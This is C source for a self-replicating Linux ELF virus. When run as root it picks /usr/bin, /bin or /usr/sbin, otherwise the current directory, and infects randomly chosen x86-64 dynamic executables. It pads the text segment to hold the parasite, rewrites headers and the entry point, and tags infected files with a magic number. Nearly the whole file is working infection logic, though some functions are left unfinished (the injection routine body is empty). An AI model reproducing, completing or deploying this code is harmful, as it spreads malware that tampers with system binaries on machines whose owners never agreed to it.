#include "private.h"

#define LUCKY_NUMBER 7
#define MAGIC_NUMBER 0x15D25 //thankz Mr. h0ffman

extern long real_start;
extern long get_rip_label;

unsigned long get_rip(void);

struct bootstrap_data {
	int argc;
	char **argv;
};

typedef struct elfbin {
	Elf64_Ehdr *ehdr;
	Elf64_Phdr *phdr;
	Elf64_Shdr *shdr;
	Elf64_Addr textVaddr;
	Elf64_Addr dataVaddr;
	size_t textSize;
	size_t dataSize;
	uint8_t *mem;
	size_t size;
	char *path;
} elfbin_t;

struct bootstrap_data bootstrap __attribute__((section(".data"))) = { 0x00 };

#define DIR_COUNT 3
static const char *dirs[] = {
		"/usr/bin",
		"/bin",
		"/usr/sbin",
		NULL
		};


_start()
{	
	/*
	 * Get argc, and char **argv
	 */
        asm __volatile__("mov 8(%%rbp), %%rcx " : "=c" (bootstrap.argc));
        asm __volatile__("lea 16(%%rbp), %%rcx " : "=c" (bootstrap.argv));
	
	/*
	 * Save register state before executing parasite
	 * code.
	 */
	asm __volatile__ (".globl real_start	\n"
 	 "push %rsp	\n"
	 "push %rbp	\n"
	 "push %rax	\n"
	 "push %rbx	\n"
	 "push %rcx	\n"
	 "push %rdx	\n"
	 "push %r8	\n"
	 "push %r9	\n"
	 "push %r10	\n"
	 "push %r11	\n"
	 "push %r12	\n"
	 "push %r13	\n"
	 "push %r14	\n"
	 "push %r15	\n"
	 "call do_main	\n"
	 "pop %r15	\n"
	 "pop %r14	\n"
	 "pop %r13	\n"
	 "pop %r12	\n"
	 "pop %r11	\n"
	 "pop %r10	\n"
	 "pop %r9	\n"
	 "pop %r8	\n"
	 "pop %rdx	\n"
	 "pop %rcx	\n"
	 "pop %rbx	\n"
	 "pop %rax	\n"
	 "pop %rbp	\n"
	 "pop %rsp	\n"
	 "jmp end_code	\n"
	);
}

/*
 * Heap areas are created by passing a NULL initialized
 * pointer by reference.  Each heap area maxes out at 4k
 * and it is up to the caller of vx_malloc() to keep track
 * of how much space has been used. For our uses this is
 * perfect.
 */
void * vx_malloc(size_t len, uint8_t **mem)
{
	if (*mem == NULL) {
		*mem = _mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
		if (*mem == MAP_FAILED) {
			DEBUG_PRINT("malloc failed with mmap\n");
			Exit(-1);
		}
	}
	*mem += len;
	**mem = 0;
	return (void *)((char *)*mem - len);
}

void vx_free(uint8_t *mem)
{
	uintptr_t addr = (uintptr_t)mem;
	addr &= ~4095;
	mem = (uint8_t *)addr;
	_munmap(mem, 4096);
}
/*
 * We rely on ASLR to get our psuedo randomness, since RSP will be different
 * at each execution.
 */

uint32_t get_random_number(int max)
{
	long rsp;
        asm __volatile__("mov %%rsp, %0" : "=r"(rsp));
	_srand(rsp);
	return _rand() % max;
}
	
char * randomly_select_dir(void) 
{	
	return (char *)dirs[get_random_number(DIR_COUNT)];
}

char * full_path(char *exe, char *dir)
{
	static uint8_t *heap = NULL;
	char *ptr = (char *)vx_malloc(_strlen(exe) + _strlen(dir) + 2, &heap);
	Memset(ptr, 0, _strlen(exe) + _strlen(dir));
	_memcpy(ptr, dir, strlen(dir));
	ptr[strlen(dir)] = '/';
	if (*exe == '.' && *(exe + 1) == '/')
		exe += 2;
	_memcpy(&ptr[strlen(dir) + 1], exe, strlen(exe));
	return ptr;
}
	
#define JMPCODE_LEN 6

void inject_parasite(size_t psize, elfbin_t *target, elfbin_t *self, ElfW(Addr) entry_point)
{
	int ofd;
	unsigned int c;
	int i, t = 0, ehdr_size = sizeof(ElfW(Ehdr));
	unsigned char *mem = target->mem;
	unsigned char *parasite = self->mem + ehdr_size;
	char *host = target->path, *protected; 
	elfbin_t newBin;
	struct stat st;



}

int infect_elf_file(elfbin_t *self, elfbin_t *target)
{
	Elf64_Ehdr *ehdr;
	Elf64_Phdr *phdr;
	Elf64_Shdr *shdr;
	uint8_t *mem;
	int fd;
	int text_found = 0, i;
        Elf64_Addr orig_entry_point;
        Elf64_Addr origText;
	size_t parasiteSize;
	size_t paddingSize;
	struct stat st;
	
	/*
	 * Get size of parasite (self)
	 */
        parasiteSize = self->size;
	paddingSize = PAGE_ALIGN_UP(parasiteSize + JMPCODE_LEN);
	
	
	
	mem = target->mem;
	ehdr = (Elf64_Ehdr *)target->ehdr;
	phdr = (Elf64_Phdr *)target->phdr;
	shdr = (Elf64_Shdr *)target->shdr;
	orig_entry_point = ehdr->e_entry;
	
	phdr[0].p_offset += paddingSize;
        phdr[1].p_offset += paddingSize;
        
        for (i = 0; i < ehdr->e_phnum; i++) {
                if (text_found)
                        phdr[i].p_offset += paddingSize;
        
                if (phdr[i].p_type == PT_LOAD && phdr[i].p_flags == (PF_R|PF_X)) {
                                origText = phdr[i].p_vaddr;
                                phdr[i].p_vaddr -= paddingSize;
                                phdr[i].p_paddr -= paddingSize;
                                phdr[i].p_filesz += paddingSize;
                                phdr[i].p_memsz += paddingSize;
                                text_found = 1;
                }
        }
        if (!text_found) {
                DEBUG_PRINT("Error, unable to locate text segment in target executable: %s\n", target->path);
                return -1;
        }

	ehdr->e_entry = origText - paddingSize + sizeof(ElfW(Ehdr));
	shdr = (Elf64_Shdr *)&mem[ehdr->e_shoff];

	for (i = 0; i < ehdr->e_shnum; i++) 
		shdr[i].sh_offset += paddingSize;
	
	ehdr->e_shoff += paddingSize;
	ehdr->e_phoff += paddingSize;

	inject_parasite(parasiteSize, target, self, orig_entry_point);

}
/*
 * Since our parasite exists of both a text and data segment
 * we include the initial ELF file header and phdr in each parasite
 * insertion. This lends itself well to being able to self-load by
 * parsing our own program headers etc.
 */
int load_self(elfbin_t *elf)
{	
	int i;
	Elf64_Addr _start_addr = get_rip() - ((char *)&get_rip_label - (char *)&_start);
	elf->mem = (void *)((long)&_start_addr & ~4095);
	elf->ehdr = (Elf64_Ehdr *)elf->mem;
	elf->phdr = (Elf64_Phdr *)&elf->mem[elf->ehdr->e_phoff];
	for (i = 0; i < elf->ehdr->e_phnum; i++) {
		if (elf->phdr[i].p_type == PT_LOAD)
			switch(!!elf->phdr[i].p_offset) {
				case 0:
					elf->textVaddr = elf->phdr[i].p_vaddr;
					elf->textSize = elf->phdr[i].p_memsz;
					break;
				case 1:
					elf->dataVaddr = elf->phdr[i].p_vaddr;
					elf->dataSize = elf->phdr[i].p_memsz;
					break;
			}
			
	}
	elf->size = ((elf->dataVaddr + elf->dataSize) - _start_addr);
	return 0;
}

int load_target(const char *path, elfbin_t *elf)
{
	int i;
	struct stat st;
	int fd = _open(path, O_RDONLY);
	if (fd < 0)
		return -1;
	if (_fstat(fd, &st) < 0)
		return -1;
	elf->mem = _mmap(NULL, st.st_size, PROT_READ|PROT_WRITE, MAP_PRIVATE, fd, 0);
	if (elf->mem == MAP_FAILED)
		return -1;
	elf->ehdr = (Elf64_Ehdr *)elf->mem;
	elf->phdr = (Elf64_Phdr *)&elf->mem[elf->ehdr->e_phoff];
	elf->shdr = (Elf64_Shdr *)&elf->mem[elf->ehdr->e_shoff];
	for (i = 0; i < elf->ehdr->e_phnum; i++) {
		if (elf->phdr[i].p_type == PT_LOAD)
                	switch(!!elf->phdr[i].p_offset) {
                        	case 0:
                                	elf->textVaddr = elf->phdr[i].p_vaddr;
                                	elf->textSize = elf->phdr[i].p_memsz;
                                	break;
                               	case 1:
                                	elf->dataVaddr = elf->phdr[i].p_vaddr;
                                	elf->dataSize = elf->phdr[i].p_memsz;
                                	break;
                        }
        }
	elf->size = st.st_size;
	return 0;
}

/*
 * Must be ELF
 * Must be ET_EXEC
 * Must be dynamically linked
 * Must not yet be infected
 */
int check_criteria(char *filename)
{
	int fd, dynamic, i, ret = 0;
	struct stat st;
	Elf64_Ehdr *ehdr;
	Elf64_Phdr *phdr;
	uint8_t mem[4096];
	uint32_t magic;
	
	fd = _open(filename, O_RDONLY);
	if (fd < 0) 
		return -1;
	if (_read(fd, mem, 4096) < 0)
		return -1;
	_close(fd);
	ehdr = (Elf64_Ehdr *)mem;
	phdr = (Elf64_Phdr *)&mem[ehdr->e_phoff];
	if (mem[0] != 0x7f && strncmp((char *)&mem[1], "ELF", 3)) 
		return -1;
	magic = *(uint32_t *)((char *)&ehdr->e_ident[EI_PAD]);
	if (magic == MAGIC_NUMBER) //already infected? Then skip this file
		return -1;
	if (ehdr->e_machine != EM_X86_64)
		return -1;
	for (dynamic = 0, i = 0; i < ehdr->e_phnum; i++) 
		if (phdr[i].p_type == PT_DYNAMIC)	
			dynamic++;
	if (!dynamic) 
		return -1;

}
void do_main(void)
{
	Elf64_Ehdr *ehdr;
	Elf64_Phdr *phdr;
	Elf64_Shdr *shdr;
	uint8_t *mem;
	
	struct linux_dirent64 *d;
	int bpos, fcount, dd, nread;
	char *dir = NULL, **files, dbuf[1024];
	struct stat st;
	mode_t mode;
	uint32_t rnum;
	elfbin_t self, target;

	dir = _getuid() != 0 ? "." : randomly_select_dir();
	
	DEBUG_PRINT("Infecting files in directory: %s\n", dir);
	
	dd = _open(dir, O_RDONLY | O_DIRECTORY);
	if (dd < 0) {
		DEBUG_PRINT("open failed\n");
		return;
	}
	
	load_self(&self);
	
	for (;;) {
		nread = _getdents64(dd, (struct linux_dirent64 *)dbuf, 4096);
		if (nread < 0) {
			DEBUG_PRINT("getdents64 failed\n");
			return;
		}
		if (nread == 0)
			break;
		for (fcount = 0, bpos = 0; bpos < nread; bpos++) {
			d = (struct linux_dirent64 *) (dbuf + bpos);
    			bpos += d->d_reclen - 1;
			rnum = get_random_number(10);
			if (rnum != LUCKY_NUMBER)
				continue;
			if (d->d_name[0] == '.')
				continue;
			if (check_criteria(full_path(d->d_name, dir)) < 0)
				continue;
			DEBUG_PRINT("infecting file: %s\n", d->d_name);
			
			load_target(d->d_name, &target);
			infect_elf_file(&self, &target);
		}
		
	}
}

unsigned long get_rip(void)
{
	long ret;
	__asm__ __volatile__ 
	(
	"call get_rip_label	\n"
       	".globl get_rip_label	\n"
       	"get_rip_label:		\n"
        "pop %%rax		\n"
	"mov %%rax, %0" : "=r"(ret)
	);

	return ret;
}


void end_code() {

	Exit(0);

}

